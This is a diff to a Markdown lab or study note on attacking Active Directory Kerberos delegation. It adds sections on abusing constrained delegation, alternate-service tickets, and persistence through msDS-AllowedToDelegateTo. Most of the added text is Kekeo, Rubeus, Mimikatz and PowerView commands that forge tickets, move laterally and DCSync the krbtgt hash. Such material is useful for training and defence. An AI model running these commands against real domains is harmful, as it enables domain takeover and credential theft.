@@ -4,7 +4,10 @@
   - [Kerberos Delegation](#kerberos-delegation)
   - [Unconstrained Delegation](#unconstrained-delegation)
   - [Leveraging Unconstrained Delegation](#leveraging-unconstrained-delegation)
-  - [Printer Bug](#printer-bug)
+  - [Unconstrained Delegation & Printer Bug](#unconstrained-delegation--printer-bug)
+  - [Constrained Delegation](#constrained-delegation)
+  - [Leveraging Constrained Delegation](#leveraging-constrained-delegation)
+  - [Persistence using `msDS-AllowedToDelegateTo`](#persistence-using-msds-allowedtodelegateto)
 
 ----
 
@@ -93,7 +96,7 @@ How do we trick a high privilege user to connect to a machine with Unconstrained
 
 <br/>
 
-## Printer Bug
+## Unconstrained Delegation & Printer Bug
 
 ![picture 43](images/9f6c90efda5fd1eda724495f467277fe9d8b005e2428d067bae9cc1648d2a1db.png)  
 
@@ -143,6 +146,209 @@ Then run DCSync:
 
 ```
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
+```
+
+<br/>
+
+## Constrained Delegation
+
+**Constrained Delegation** allows access only to **specified services** on **specified computers as a user**. 
+
+To impersonate the user, Service for User (S4U) extension is used which provides two extensions:
+
+1. **Service for User to Proxy (S4U2proxy)**: Allows a service to obtain a TGS to a second service (controlled by SPNs on `msDs-AllowedToDelegateTo`) on behalf of a user.
+2. **Service for User to Self (S4U2self)**: Allows a service (must have `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION`) to obtain a forwardable TGS to itself on behalf of a user (no actual Kerberos authentication by user takes place). Used in Protocol Transition i.e. when user authenticates with non-Kerberos authentication.
+
+<br/>
+
+To abuse constrained delegation with protocol transition, we need to **compromise the web service (first hop) account**. If we have access to that account, it is possible to access the services listed in `msDSAllowedToDelegateTo` of the web service account as **ANY user**.
+
+<br/>
+
+## Leveraging Constrained Delegation
+
+![picture 16](images/e611908898f0d233b09f1a640ddd71103ab2749e99b562f6b63417336b1114a7.png)  
+
+1. A user authenticates to the web service using a **non-Kerberos compatible** authentication mechanism.
+2. The web service requests a ticket from the Key Distribution Center (KDC) for user's account without supplying a password, as the webservice account.
+3. The KDC checks the webservice `userAccountControl` value for the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` attribute, and that user's account is not blocked for delegation. If OK it returns a forwardable ticket for user's account (`S4U2Self`).
+4. The service then passes this ticket back to the KDC and requests a service ticket for the SQL Server service.
+5. The KDC checks the `msDS-AllowedToDelegateTo` field on the web service account. If the service is listed it will return a service ticket for MSSQL (`S4U2Proxy`).
+6. The web service can now authenticate to the sql server as the user using the supplied TGS.
+
+<br/>
+
+To enumerate computers / users with constrained delegation:
+
+- PowerView
+
+```
+Get-DomainUser –TrustedToAuth
+```
+
+```
+Get-DomainComputer -TrustedToAuth
+```
+
+
+- AD Module
+
+```
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne
+"$null"} -Properties msDS-AllowedToDelegateTo
+```
+
+<br/>
+
+Using **Kekeo**, we request a TGT for the first hop service account (we can use a password or NTLM hash):
+
+```
+tgt::ask /user:appsvc /domain:us.techcorp.local /rc4:1D49D390AC01D568F0EE9BE82BB74D4C
+```
+
+<br/>
+
+Another interesting issue in Kerberos is that the delegation occurs **not only for the specified service but for any service running under the same account**. There is no validation for the SPN specified. This is huge as it allows access to many interesting services when the delegation may be for a non-intrusive service!
+
+<br/>
+
+Using **Kekeo**, we request a TGS (steps 4 & 5):
+
+```
+tgs::s4u /tgt:TGT_appsvc@US.TECHCORP.LOCAL_krbtgt~us.techcorp.loc al@US.TECHCORP.LOCAL.kirbi /user:Administrator /service:CIFS/us-mssql.us.techcorp.local|HTTP/usmssql.us.techcorp.local
+```
+
+<br/>
+
+In addition to the service specified in `msDs-AllowedToDelegateTo`, we also specify an alternate service which uses the same service account as the one speficied in `msDs-AllowedToDelegateTo`.
+
+<br/>
+
+Using **Mimikatz:**
+
+```
+Invoke-Mimikatz '"kerberos::ptt TGS_Administrator@US.TECHCORP.LOCAL_HTTP~usmssql.us.techcorp.local@US.TECHCORP.LOCAL_ALT.kirbi"'
+```
+
+Then try to remotely execute command on US-MSSQL:
+
+```
+Invoke-Command -ScriptBlock{whoami} -ComputerName usmssql.us.techcorp.local
+```
+
+<br/>
+
+Alternatively, we can use **Rubeus.exe**:
+
+```
+Rubeus.exe s4u /user:appsvc /rc4:1D49D390AC01D568F0EE9BE82BB74D4C /impersonateuser:administrator /msdsspn:CIFS/usmssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt
+```
+
+```
+winrs -r:us-mssql cmd.exe
+```
+
+<br/>
+
+---
+
+## Persistence using `msDS-AllowedToDelegateTo`
+
+Note that the `msDS-AllowedToDelegateTo` is the user account flag which controls the services to which a user account has access to. This means, with enough privileges, **it is possible to access any service from a user** – a neat persistence trick.
+
+Enough privileges = `SeEnableDelegationPrivilege` on the DC and full rights on the target user - default for Domain Admins and Enterprise Admins.
+
+That is, we can force set '`Trusted to Authenticate for Delegation`' and `ms-DS-AllowedToDelegateTo` on a user (or create a new user - which is more noisy) and abuse it later.
+
+<br/>
+
+- PowerView
+
+```
+Get-DomainUser –TrustedToAuth
+```
+
+```
+Set-DomainObject -Identity devuser -Set @{serviceprincipalname='dev/svc'}
+```
+
+```
+Set-DomainObject -Identity devuser -Set @{"msds-allowedtodelegateto"="ldap/usdc.us.techcorp.local"}
+```
+
+```
+Set-DomainObject -SamAccountName devuser1 -Xor @{"useraccountcontrol"="16777216"}
+```
+
+```
+Get-DomainUser –TrustedToAuth
+```
+
+- AD Module
+
+```
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDSAllowedToDelegateTo
+```
+
+```
+Set-ADUser -Identity devuser -ServicePrincipalNames @{Add='dev/svc'}
+```
+
+```
+Set-ADUser -Identity devuser -Add @{'msDS-AllowedToDelegateTo'= @('ldap/usdc','ldap/us-dc.us.techcorp.local')} -Verbose
+```
+
+```
+Set-ADAccountControl -Identity devuser -TrustedToAuthForDelegation $true
+```
+
+```
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDSAllowedToDelegateTo
+```
+
+<br/>
+
+To abuse, use **Kekeo**:
+
+```
+tgt::ask /user:devuser /domain:us.techcorp.local /password:Password@123!
+```
+
+```
+tgs::s4u /tgt:TGT_devuser@us.techcorp.local_krbtgt~us.techcorp.local@us.techc orp.local.kirbi /user:Administrator@us.techcorp.local /service:ldap/us-dc.us.techcorp.local
+```
+
+<br/>
+
+Then use **Mimikatz** to ptt:
+
+```
+Invoke-Mimikatz -Command '"kerberos::ptt
+TGS_Administrator@us.techcorp.local@us.techcorp.local_ldap~usdc.us.techcorp.local@us.techcorp.local.kirbi"'
+```
+
+<br/>
+
+Perform DCSync:
+
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
+```
+
+<br/>
+
+Alternatively, we can use **Rubeus**:
+
+```
+Rubeus.exe hash /password:Password@123! /user:devuser /domain:us.techcorp.local
+```
+
+```
+Rubeus.exe s4u /user:devuser /rc4:539259E25A0361EC4A227DD9894719F6 /impersonateuser:administrator /msdsspn:ldap/us-dc.us.techcorp.local /domain:us.techcorp.local /ptt
+```
+
+```
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
 ```
 
 <br/>
